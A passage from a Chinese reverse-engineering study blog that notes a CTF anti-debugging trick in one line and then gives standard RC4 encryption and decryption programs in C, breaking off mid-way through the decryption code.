<h2 id="烽火杯的smc"><a href="#烽火杯的smc" class="headerlink" title="烽火杯的smc"></a>烽火杯的smc</h2><p>这个算是最简单的反调试改jz就可以，直接linux动调就可以还原了，就不都说了xixi。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/27/rc4%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/27/rc4%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">rc4学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-27 15:38:14" itemprop="dateCreated datePublished" datetime="2025-07-27T15:38:14+08:00">2025-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:59:18" itemprop="dateModified" datetime="2025-09-23T20:59:18+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/rc4%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">rc4学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>感觉打了这么就得逆向，没AI感觉就不中了，啥也干不了，于是从现在开始学习原理知识。</p>
<p>开始rc4的学习以后碰到rc4就放到这个里面来。开始全栈之逆向之路。</p>
<h3 id="标准rec4加密"><a href="#标准rec4加密" class="headerlink" title="标准rec4加密"></a>标准rec4加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LEN 1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> i;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">&#125; RC4_CTX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// 使用 int 避免 size_t 转换警告</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (<span class="type">unsigned</span> <span class="type">char</span>)(j + ctx-&gt;S[i] + key[i % key_len]);  <span class="comment">// 显式转换</span></span><br><span class="line">        temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成密钥流字节 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX* ctx)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    ctx-&gt;i = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;i + <span class="number">1</span>);</span><br><span class="line">    ctx-&gt;j = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]);</span><br><span class="line">    temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) &amp; <span class="number">0xFF</span>];  <span class="comment">// 使用位操作避免转换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* input,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 二进制转十六进制 */</span></span><br><span class="line"><span class="type">char</span>* <span class="title function_">bin2hex</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* bin, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* hex = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hex) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        sprintf_s(hex + i * <span class="number">2</span>, <span class="number">3</span>, <span class="string">&quot;%02X&quot;</span>, bin[i]);  <span class="comment">// 使用安全的 sprintf_s</span></span><br><span class="line">    &#125;</span><br><span class="line">    hex[len * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 安全获取输入 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_input</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* prompt, <span class="type">char</span>* buffer, <span class="type">size_t</span> max_len)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="keyword">if</span> (fgets(buffer, (<span class="type">int</span>)max_len, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;  <span class="comment">// 显式转换</span></span><br><span class="line">        buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除换行符</span></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span> &amp;&amp; buffer[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        buffer[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[MAX_INPUT_LEN];</span><br><span class="line">    <span class="type">char</span> plaintext[MAX_INPUT_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== RC4 加密工具 ===\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    get_input(<span class="string">&quot;请输入密钥: &quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    get_input(<span class="string">&quot;请输入明文: &quot;</span>, plaintext, <span class="keyword">sizeof</span>(plaintext));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(plaintext);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;错误: 明文不能为空\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ciphertext = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">if</span> (!ciphertext) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密过程</span></span><br><span class="line">    RC4_CTX ctx;</span><br><span class="line">    rc4_init(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)plaintext, ciphertext, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为十六进制</span></span><br><span class="line">    <span class="type">char</span>* hex_cipher = bin2hex(ciphertext, len);</span><br><span class="line">    <span class="keyword">if</span> (!hex_cipher) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 十六进制转换失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(ciphertext);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密结果:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密钥: %s\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文: %s\n&quot;</span>, plaintext);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文(HEX): %s\n&quot;</span>, hex_cipher);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内存</span></span><br><span class="line">    <span class="built_in">free</span>(ciphertext);</span><br><span class="line">    <span class="built_in">free</span>(hex_cipher);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n按 Enter 键退出...&quot;</span>);</span><br><span class="line">    getchar();  <span class="comment">// 忽略返回值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="标准rec4解密"><a href="#标准rec4解密" class="headerlink" title="标准rec4解密"></a>标准rec4解密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LEN 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> i;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j;  <span class="comment">// 改为 unsigned char 避免转换问题</span></span><br><span class="line">&#125; RC4_CTX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// 使用 int 避免 size_t 转换警告</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (<span class="type">unsigned</span> <span class="type">char</span>)(j + ctx-&gt;S[i] + key[i % key_len]);  <span class="comment">// 显式转换</span></span><br><span class="line">        temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成密钥流字节 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX* ctx)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    ctx-&gt;i = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;i + <span class="number">1</span>);</span><br><span class="line">    ctx-&gt;j = (<span class="type">unsigned</span> <span class="type">char</span>)(ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]);</span><br><span class="line">    temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) &amp; <span class="number">0xFF</span>];  <span class="comment">// 使用位操作避免转换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX* ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* input,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 十六进制转二进制 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">hex2bin</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* hex, <span class="type">size_t</span>* len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> hex_len = <span class="built_in">strlen</span>(hex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查十六进制长度</span></span><br><span class="line">    <span class="keyword">if</span> (hex_len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制长度\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *len = hex_len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (*len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* bin = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(*len);</span><br><span class="line">    <span class="keyword">if</span> (!bin) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; *len; i++) &#123;</span><br><span class="line">        <span class="type">char</span> hex_byte[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        hex_byte[<span class="number">0</span>] = hex[i * <span class="number">2</span>];</span><br><span class="line">        hex_byte[<span class="number">1</span>] = hex[i * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* endptr;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> value = strtoul(hex_byte, &amp;endptr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*endptr != <span class="string">&#x27;\0&#x27;</span> || value &gt; <span class="number">255</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制字节 &#x27;%s&#x27;\n&quot;</span>, hex_byte);</span><br><span class="line">            <span class="built_in">free</span>(bin);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bin[i] = (<span class="type">unsigned</span> <span class="type">char</span>)value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 安全获取输入 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_input</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* prompt, <span class="type">char</span>* buffer, <span class="type">size_t</span> max_len)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="keyword">if</span> (fgets(buffer, (<span class="type">int</span>)max_len, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;  <span class="comment">// 显式转换</span></span><br><span class="line">        buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除换行符</span></span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span> &amp;&amp; buffer[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        buffer[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[MAX_INPUT_LEN];</span><br><span class="line">    <span class="type">char</span> hex_cipher[MAX_INPUT_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== RC4 解密工具 ===\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    get_input(<span class="string">&quot;请输入密钥: &quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    get_input(<span class="string">&quot;请输入密文(HEX): &quot;</span>, hex_cipher, <span class="keyword">sizeof</span>(hex_cipher));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证十六进制输入</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; hex_cipher[i]; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isxdigit</span>((<span class="type">unsigned</span> <span class="type">char</span>)hex_cipher[i])) &#123;  <span class="comment">// 显式类型转换</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 无效的十六进制字符 